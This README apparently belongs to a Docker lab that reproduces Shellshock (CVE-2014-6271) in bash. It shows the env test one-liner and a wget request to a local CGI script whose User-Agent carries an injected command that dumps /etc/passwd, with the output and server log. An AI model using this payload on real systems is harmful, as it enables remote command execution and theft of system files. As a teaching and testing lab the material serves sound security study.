# Shellshock

Its [history](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) is a little messy, btw
it affects ``bash`` version 4.3 before September 2014.

## PoC

The most used oneliner is the following

```
$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```

## Docker

The ``Dockerfile`` prepare a Debian 7 with a vulnerable bash version
and a ``CGI`` script named ``hello.cgi`` in ``/cgi-bin/``. The example
below exposes the ``apache2`` instance on port 8000 on localhost:

```
$ docker build -t  gipi/shellshock CVE-2014-6271/

 [a lot of logging]

$ docker run -p 8000:80  gipi/shellshock
Starting web server: apache2apache2: Could not reliably determine the server's fully qualified domain name, using 172.17.0.4 for ServerName
.
==> /var/log/apache2/access.log <==

==> /var/log/apache2/error.log <==

==> /var/log/apache2/other_vhosts_access.log <==

==> /var/log/apache2/error.log <==
[Tue Apr 24 06:39:07 2018] [notice] Apache/2.2.22 (Debian) configured -- resuming normal operations

==> /var/log/apache2/access.log <==
172.17.0.1 - - [24/Apr/2018:06:39:11 +0000] "GET /cgi-bin/hello.cgi HTTP/1.1" 200 261 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
```

from the outside

```
$ wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:8000/cgi-bin/hello.cgi -O -
--2018-04-24 08:41:38--  http://localhost:8000/cgi-bin/hello.cgi
Risoluzione di localhost (localhost)... ::1, 127.0.0.1
Connessione a localhost (localhost)|::1|:8000... connesso.
Richiesta HTTP inviata, in attesa di risposta... 200 OK
Lunghezza: non specificato [text/plain]
Salvataggio in: "STDOUT"

-                                                        [<=>                                                                                                                   ]       0  --.-KB/s               
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
-                                                        [ <=>                                                                                                                  ]     762  --.-KB/s    in 0s      

2018-04-24 08:41:38 (3,54 MB/s) - scritto su stdout [762]
```

and this is the log

```
172.17.0.1 - - [24/Apr/2018:06:39:30 +0000] "GET /cgi-bin/hello.cgi HTTP/1.1" 200 1000 "-" "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd"
```

## Link

 - [Advisor](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
 - [Debian](https://security-tracker.debian.org/tracker/CVE-2014-6271)
 - [Fun with cgi-bin and Shellshock](https://retracile.net/blog/2014/09/27/00.50)
 - [Shellshock DHCP RCE Proof of Concept](https://www.trustedsec.com/2014/09/shellshock-dhcp-rce-proof-concept/)
 - https://www.a1logic.com/2014/09/28/shellshock-vulnerability-patch-and-exploit-analysis/
